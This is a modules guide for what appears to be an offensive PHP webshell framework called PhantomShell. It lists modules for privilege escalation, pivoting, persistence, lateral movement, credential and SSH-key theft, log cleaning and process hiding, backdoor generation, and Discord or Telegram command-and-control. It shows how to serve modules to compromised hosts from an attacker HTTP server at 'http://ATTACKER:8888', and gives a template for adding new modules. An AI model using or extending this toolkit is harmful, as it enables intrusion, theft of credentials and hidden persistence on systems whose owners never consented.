# Modules Guide

## Overview

Modules are standalone PHP files that can be loaded dynamically in MINIMAL mode. When the target server has restricted capabilities, the loader can fetch individual modules from the attacker's HTTP server.

## Available Modules

| Module | File | Functions |
|--------|------|-----------|
| Privilege Escalation | `modules/privesc.php` | SUID scan, GTFOBins, exploit suggest |
| Pivoting | `modules/pivoting.php` | Port forwarding, SOCKS4 proxy |
| Persistence | `modules/persistence.php` | Cron, bashrc, systemd, SSH, webshell |
| Lateral Movement | `modules/lateral.php` | SSH, SCP, spray, subnet scan |
| Credential Stealing | `modules/stealing.php` | Configs, SSH keys, history, /etc |
| Evasion | `modules/evasion.php` | Log cleaning, timestomp, hide process |
| Backdoor | `modules/backdoor.php` | PHP, cron, multi-language generators |
| C2 | `modules/c2.php` | Discord, Telegram, HTTP, beacon, poll |
| Automation | `modules/automation.php` | Auto-recon, persist, clean, report |

## Loading Modules

### From MINIMAL mode shell
```
fetch privesc
fetch lateral
fetch stealing
```

### Setup module server
```bash
cd PhantomShell/
python3 -m http.server 8888
```

The loader fetches from `http://ATTACKER:8888/modules/<name>.php`

### Manual loading
```php
// From PHP
include('/path/to/modules/privesc.php');
$results = mod_privesc_scan($sock);
```

## Creating Custom Modules

1. Create a PHP file in `modules/`
2. Define functions with `mod_` prefix
3. Add an `if (isset($sock))` block for auto-init when loaded via `fetch`

### Template
```php
<?php
// PhantomShell Module: MyModule

function mod_myfunction($sock, $args) {
    // Your code here
    return $result;
}

if (isset($sock)) {
    @fwrite($sock, "  MyModule loaded.\n");
}
?>
```
